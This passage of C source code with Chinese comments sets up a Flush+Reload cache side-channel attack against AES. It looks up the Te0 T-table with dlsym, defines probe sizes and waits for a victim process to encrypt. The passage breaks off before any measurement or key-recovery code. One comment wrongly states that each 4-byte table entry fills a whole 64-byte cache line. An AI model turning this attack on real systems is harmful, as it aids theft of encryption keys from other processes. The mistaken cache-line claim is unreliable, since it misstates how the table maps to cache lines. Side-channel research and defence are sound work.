    return dlsym(handle, "Te0");
}

// 探测数组大小：每个T-table有256个4字节项，每个项占用一个缓存行（64字节）
#define TABLE_SIZE 256
#define CACHE_LINE 64

int main() {
    uint8_t *te0 = (uint8_t *)get_te0_addr();
    if (!te0) {
        printf("Failed to get Te0 address\n");
        return 1;
    }

    // 初始化探测数组（用于Flush+Reload）
    // 实际中直接使用T-table地址

    // 等待受害者执行AES加密（例如通过共享文件触发）
    // 这里假设受害者已经执行

